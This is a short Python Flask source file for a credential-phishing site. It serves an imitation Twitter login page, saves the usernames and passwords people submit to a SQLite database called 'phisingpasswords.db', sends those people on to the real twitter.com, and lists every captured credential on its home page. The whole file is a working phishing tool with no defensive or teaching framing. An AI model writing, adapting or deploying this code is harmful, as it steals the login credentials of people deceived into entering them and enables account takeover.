import sqlite3
from flask import Flask, render_template, request,redirect
app = Flask(__name__)
@app.route('/')
def display_passwords():
    con = sqlite3.connect("phisingpasswords.db")
    con.row_factory = sqlite3.Row
    cur = con.cursor()
    cur.execute("select * from USER_PASS")
    rows = cur.fetchall()
    return render_template('showpasswords.html', rows = rows)
@app.route('/twitter')
def twitter():
    return render_template('twitter.html')
@app.route('/send_password', methods = ['POST','GET'])
def send_password():
    con = sqlite3.connect("phisingpasswords.db")
    sql = 'INSERT INTO USER_PASS(username,password) VALUES(?, ?)'
    cur = con.cursor()
    un = request.form['username']
    pw = request.form["password"]
    cur.execute(sql,[un,pw])
    con.commit()
    print("inserted into database maybe")
    return redirect("http://twitter.com")